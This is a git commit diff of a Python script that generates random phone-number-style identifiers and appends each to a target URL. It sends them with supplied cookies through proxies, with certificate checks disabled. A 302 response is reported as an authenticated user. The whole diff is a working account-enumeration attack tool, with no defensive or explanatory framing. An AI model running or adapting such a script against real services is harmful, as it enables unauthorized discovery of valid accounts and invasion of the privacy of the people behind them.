034a1e47b723f177ee3baa22d001ad1c9e98b2bf
SickAndTired <78124142+S1ckAndTired@users.noreply.github.com>
2022-06-10 20:50:41 +0000

    Update la-telefona.py

--- la-telefona.py
+++ la-telefona.py
@@ -19,9 +19,6 @@ NG = '\33[0m'
 RIG = '\33[94m'
 HT = '\33[0m'
 
-#Delimeters
-ddd = list(range(11, 24))
-fixos = list(range(67, 99))
 
 
 #Counter for requests
@@ -39,26 +36,24 @@ requests.urllib3.disable_warnings()
 
 def numeros():
     global count
-    for d in ddd:
-        for pre in fixos:
-            part1=str(d)+str(pre)
-            for f in range(100000):
-                random_numbers = random.randint(100000, 1000000)
-                numeros.var = (part1+str(random_numbers))
-                count = count + 1
-                url = target.var
-                req = requests.get(url+numeros.var, cookies=cookie.var, proxies=proxy.var, verify=False, allow_redirects=False)
-                status = req.status_code
-                #print(status)
-                if status != 302:
-                    print(WRO + "[-]" + NG +  f"Invalid User - {numeros.var}")
-                else:
-                    print(RIG + "[+]" + HT + f"Authenticated User - {numeros.var}")
-                if count%3 == 0:
-                    for i in "Cooling Down...\n":
-                            sys.stdout.write(i)
-                            sys.stdout.flush()
-                            time.sleep(0.5)
+    for i in range(100):
+        random_ddd = random.randint(11, 24)
+        random_fixos = random.randint(67, 97)
+        random_rest = random.randint(1000000, 100000000)
+        numeros.var = (str(random_ddd)+str(random_fixos)+str(random_rest))
+        count = count + 1
+        url = target.var
+        req = requests.get(url+numeros.var, cookies=cookie.var, proxies=proxy.var, verify=False, allow_redirects=False)
+        status = req.status_code
+        if status != 302:
+            print(WRO + "[-]" + NG +  f"Invalid User - {numeros.var}")
+        else:
+            print(RIG + "[+]" + HT + f"Authenticated User - {numeros.var}")
+        if count%2 == 0:
+            for i in "Timing out for good...\n":
+                sys.stdout.write(i)
+                sys.stdout.flush()
+                time.sleep(0.5)
 
 
 target()
